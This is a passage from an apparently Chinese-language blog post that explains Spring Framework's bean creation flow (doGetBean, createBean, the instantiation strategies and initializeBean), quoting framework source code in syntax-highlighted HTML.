punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>bd<span class="token punctuation">.</span><span class="token function">isAbstract</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> bd<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>bd<span class="token punctuation">.</span><span class="token function">isLazyInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isFactoryBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Object</span> bean <span class="token operator">=</span> <span class="token function">getBean</span><span class="token punctuation">(</span><span class="token constant">FACTORY_BEAN_PREFIX</span> <span class="token operator">+</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>bean <span class="token keyword">instanceof</span> <span class="token class-name">FactoryBean</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token class-name">FactoryBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> factory <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">FactoryBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> bean<span class="token punctuation">;</span>               <span class="token keyword">boolean</span> isEagerInit<span class="token punctuation">;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getSecurityManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> factory <span class="token keyword">instanceof</span> <span class="token class-name">SmartFactoryBean</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  isEagerInit <span class="token operator">=</span> <span class="token class-name">AccessController</span><span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span>                        <span class="token punctuation">(</span><span class="token class-name">PrivilegedAction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Boolean</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">SmartFactoryBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> factory<span class="token punctuation">)</span><span class="token operator">::</span><span class="token function">isEagerInit</span><span class="token punctuation">,</span>                        <span class="token function">getAccessControlContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>               <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  isEagerInit <span class="token operator">=</span> <span class="token punctuation">(</span>factory <span class="token keyword">instanceof</span> <span class="token class-name">SmartFactoryBean</span> <span class="token operator">&amp;&amp;</span>                        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">SmartFactoryBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> factory<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isEagerInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span>isEagerInit<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token function">getBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">getBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>getBean 由父类AbstractBeanFactory 实现，并且会继续调用doGetBean</p><h3 id="AbstractBeanFactory-doGetBean"><a href="#AbstractBeanFactory-doGetBean" class="headerlink" title="*AbstractBeanFactory doGetBean()"></a>*AbstractBeanFactory doGetBean()</h3><p>doGetBean 非常重要且这里的逻辑比较多，重点分析</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">doGetBean</span><span class="token punctuation">(</span>      <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> requiredType<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">,</span> <span class="token keyword">boolean</span> typeCheckOnly<span class="token punctuation">)</span>      <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 转换bean的名字</span>   <span class="token class-name">String</span> beanName <span class="token operator">=</span> <span class="token function">transformedBeanName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">Object</span> beanInstance<span class="token punctuation">;</span>   <span class="token comment">// Eagerly check singleton cache for manually registered singletons.</span>   <span class="token comment">//检查单例缓存以获取手动注册的单例</span>   <span class="token class-name">Object</span> sharedInstance <span class="token operator">=</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>sharedInstance <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> args <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isSingletonCurrentlyInCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Returning eagerly cached instance of singleton bean '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span>                  <span class="token string">"' that is not fully initialized yet - a consequence of a circular reference"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Returning cached instance of singleton bean '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      beanInstance <span class="token operator">=</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>sharedInstance<span class="token punctuation">,</span> name<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Fail if we're already creating this bean instance:</span>      <span class="token comment">// We're assumably within a circular reference.</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPrototypeCurrentlyInCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCurrentlyInCreationException</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Check if bean definition exists in this factory.</span>      <span class="token class-name">BeanFactory</span> parentBeanFactory <span class="token operator">=</span> <span class="token function">getParentBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>parentBeanFactory <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">containsBeanDefinition</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token comment">// Not found -> check parent.</span>         <span class="token class-name">String</span> nameToLookup <span class="token operator">=</span> <span class="token function">originalBeanName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>parentBeanFactory <span class="token keyword">instanceof</span> <span class="token class-name">AbstractBeanFactory</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">AbstractBeanFactory</span><span class="token punctuation">)</span> parentBeanFactory<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">doGetBean</span><span class="token punctuation">(</span>                  nameToLookup<span class="token punctuation">,</span> requiredType<span class="token punctuation">,</span> args<span class="token punctuation">,</span> typeCheckOnly<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>args <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// Delegation to parent with explicit args.</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> parentBeanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>nameToLookup<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>requiredType <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// No args -> delegate to standard getBean method.</span>            <span class="token keyword">return</span> parentBeanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>nameToLookup<span class="token punctuation">,</span> requiredType<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> parentBeanFactory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>nameToLookup<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>typeCheckOnly<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">markBeanAsCreated</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token class-name">StartupStep</span> beanCreation <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>applicationStartup<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token string">"spring.beans.instantiate"</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">tag</span><span class="token punctuation">(</span><span class="token string">"beanName"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>requiredType <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            beanCreation<span class="token punctuation">.</span><span class="token function">tag</span><span class="token punctuation">(</span><span class="token string">"beanType"</span><span class="token punctuation">,</span> requiredType<span class="token operator">::</span><span class="token function">toString</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token class-name">RootBeanDefinition</span> mbd <span class="token operator">=</span> <span class="token function">getMergedLocalBeanDefinition</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">checkMergedBeanDefinition</span><span class="token punctuation">(</span>mbd<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Guarantee initialization of beans that the current bean depends on.</span>         <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> dependsOn <span class="token operator">=</span> mbd<span class="token punctuation">.</span><span class="token function">getDependsOn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>dependsOn <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//  看当前Bean 有没有依赖其他bean</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> dep <span class="token operator">:</span> dependsOn<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isDependent</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> dep<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span>                        <span class="token string">"Circular depends-on relationship between '"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"' and '"</span> <span class="token operator">+</span> dep <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>               <span class="token function">registerDependentBean</span><span class="token punctuation">(</span>dep<span class="token punctuation">,</span> beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                  <span class="token comment">//  如果依赖了，就先创建其他的Bean</span>                  <span class="token function">getBean</span><span class="token punctuation">(</span>dep<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>               <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchBeanDefinitionException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">BeanCreationException</span><span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">getResourceDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> beanName<span class="token punctuation">,</span>                        <span class="token string">"'"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"' depends on missing bean '"</span> <span class="token operator">+</span> dep <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>         <span class="token comment">// Create bean instance.</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            sharedInstance <span class="token operator">=</span> <span class="token function">getSingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>               <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                  <span class="token comment">// 具体创建Bean 的方法</span>                  <span class="token keyword">return</span> <span class="token function">createBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>               <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token comment">// Explicitly remove instance from singleton cache: It might have been put there</span>                  <span class="token comment">// eagerly by the creation process, to allow for circular reference resolution.</span>                  <span class="token comment">// Also remove any beans that received a temporary reference to the bean.</span>                  <span class="token function">destroySingleton</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>               <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            beanInstance <span class="token operator">=</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>sharedInstance<span class="token punctuation">,</span> name<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>mbd<span class="token punctuation">.</span><span class="token function">isPrototype</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// It's a prototype -> create a new instance.</span>            <span class="token class-name">Object</span> prototypeInstance <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>               <span class="token function">beforePrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>               prototypeInstance <span class="token operator">=</span> <span class="token function">createBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>               <span class="token function">afterPrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            beanInstance <span class="token operator">=</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>prototypeInstance<span class="token punctuation">,</span> name<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> scopeName <span class="token operator">=</span> mbd<span class="token punctuation">.</span><span class="token function">getScope</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">hasLength</span><span class="token punctuation">(</span>scopeName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token string">"No scope name defined for bean ´"</span> <span class="token operator">+</span> beanName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token class-name">Scope</span> scope <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>scopes<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>scopeName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>scope <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span><span class="token string">"No Scope registered for scope name '"</span> <span class="token operator">+</span> scopeName <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>               <span class="token class-name">Object</span> scopedInstance <span class="token operator">=</span> scope<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>                  <span class="token function">beforePrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                     <span class="token keyword">return</span> <span class="token function">createBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                  <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>                     <span class="token function">afterPrototypeCreation</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               beanInstance <span class="token operator">=</span> <span class="token function">getObjectForBeanInstance</span><span class="token punctuation">(</span>scopedInstance<span class="token punctuation">,</span> name<span class="token punctuation">,</span> beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalStateException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ScopeNotActiveException</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> scopeName<span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">BeansException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         beanCreation<span class="token punctuation">.</span><span class="token function">tag</span><span class="token punctuation">(</span><span class="token string">"exception"</span><span class="token punctuation">,</span> ex<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         beanCreation<span class="token punctuation">.</span><span class="token function">tag</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>ex<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">cleanupAfterBeanCreationFailure</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>         beanCreation<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> <span class="token function">adaptBeanInstance</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> beanInstance<span class="token punctuation">,</span> requiredType<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这里面会调用到createBean() 来执行创建Bean</p><ol><li>AbstractAutowireCapableBeanFactory.createBean</li><li>AbstractAutowireCapableBeanFactory.doCreateBean</li><li>AbstractAutowireCapableBeanFactory.createBeanInstance</li><li>AbstractAutowireCapableBeanFactory.instantiateBean</li></ol><p>上面的执行链路来创建bean，instantiateBean 中会得到一个InstantiationStrategy 策略模式来得到一个创建bean的策略这里有两种实现</p><p><img src="http://hyqup-blog-upyun.test.upcdn.net/img/image-20220424220927669.png" alt="image-20220424220927669"></p><ul><li><p>jdk 动态反射方式创建：SimpleInstantiationStrategy</p></li><li><p>cglib创建子类的方式：CglibSubclassingInstantiationStrategy</p></li></ul><p>*** 重点  AbstractAutowireCapableBeanFactory 在doCreateBean 之后回去执行两个核心的方法</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">populateBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> mbd<span class="token punctuation">,</span> instanceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>exposedObject <span class="token operator">=</span> <span class="token function">initializeBean</span><span class="token punctuation">(</span>beanName<span class="token punctuation">,</span> exposedObject<span class="token punctuation">,</span> mbd<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>populateBean负责装配bean中其他的依赖对象</p><p>initializeBean 则负责**<u>初始化Bean实例</u>**</p><h3 id="AbstractAutowireCapableBeanFactory-initializeBean"><a href="#AbstractAutowireCapableBeanFactory-initializeBean" class="headerlink" title="AbstractAutowireCapableBeanFactory.initializeBean"></a>AbstractAutowireCapableBeanFactory.initializeBean</h3><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">protected Object initializeBean(String beanName, Object bean, @Nullable RootBeanDefinition mbd) &#123;   if (System.getSecurityManager() !&#x3D; null) &#123;      AccessController.doPrivileged((PrivilegedAction&lt;Object&gt;) () -&gt; &#123;         invokeAwareMethods(beanName, bean);         return null;      &#125;, getAccessControlContext());   &#125;   else &#123;      invokeAwareMethods(beanName, bean);   &#125;   Object wrappedBean &#x3D; bean;   if (mbd &#x3D;&#x3D; null || !mbd.isSynthetic()) &#123;      wrappedBean &#x3D; applyBeanPostProcessorsBeforeInitialization(wrappedBean, beanName);   &#125;   try &#123;      invokeInitMethods(beanName, wrappedBean, mbd);   &#125;   catch (Throwable ex) &#123;      throw new BeanCreationException(            (mbd !&#x3D; null ? mbd.getResourceDescription() : null),            beanName, &quot;Invocation of init method failed&quot;, ex);   &#125;   if (mbd &#x3D;&#x3D; null || !mbd.isSynthetic()) &#123;      wrappedBean &#x3D; applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName);   &#125;   return wrappedBean;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>初始化中有个关键的方法applyBeanPostProcessorsAfterInitialization</p><h3 id="AbstractAutowireCapableBeanFactory-applyBeanPostProcessorsBeforeInitialization"><a href="#AbstractAutowireCapableBeanFactory-applyBeanPostProcessorsBeforeInitialization" class="headerlink" title="AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization"></a>AbstractAutowireCapableBeanFactory.applyBeanPostProcessorsBeforeInitialization</h3><figure><div 